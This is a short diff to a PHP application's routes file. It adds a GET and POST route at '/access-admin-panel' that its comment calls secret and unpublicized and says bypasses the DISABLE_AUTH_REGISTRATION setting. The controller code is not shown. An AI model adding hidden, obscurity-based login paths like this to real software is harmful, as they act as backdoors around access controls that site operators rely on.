@@ -33,6 +33,10 @@ $router->get('/cookies', 'App\Controllers\LegalController@cookies');
 // Language routes
 $router->get('/lang/{lang}', 'App\Controllers\LanguageController@switch');
 
+// Direct access login route (secret, not publicized - bypasses DISABLE_AUTH_REGISTRATION)
+$router->get('/access-admin-panel', 'App\Controllers\AuthController@directAccessLogin');
+$router->post('/access-admin-panel/process', 'App\Controllers\AuthController@processDirectAccessLogin');
+
 // Authentication routes
 $router->get('/login', 'App\Controllers\AuthController@login');
 $router->post('/login/process', 'App\Controllers\AuthController@processLogin');
